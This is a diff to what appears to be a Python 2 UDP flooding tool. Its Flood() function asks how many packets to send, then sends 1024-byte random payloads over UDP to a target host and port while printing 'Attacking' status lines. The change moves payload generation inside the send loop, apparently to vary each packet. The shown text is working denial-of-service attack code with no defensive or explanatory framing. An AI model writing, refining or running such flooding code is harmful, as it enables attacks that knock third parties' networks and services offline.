@@ -106,7 +106,6 @@ def Flood():
         print split
         length = int(raw_input("How many Packets Would you like to send?: "))
         print split
-        bytes = random._urandom(1024)
         #MESSAGE = raw_input("Message?: ")
         print ""
         print split
@@ -118,7 +117,7 @@ def Flood():
         subprocess.call('clear', shell=True)
 
         for i in range(length):
-
+            bytes = random._urandom(1024)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
             sock.sendto(bytes, (host, PORT))
             print "(Attacking: %s) (Sent %s Packets) (Destination Port: %s)"%(host, SENT, PORT)
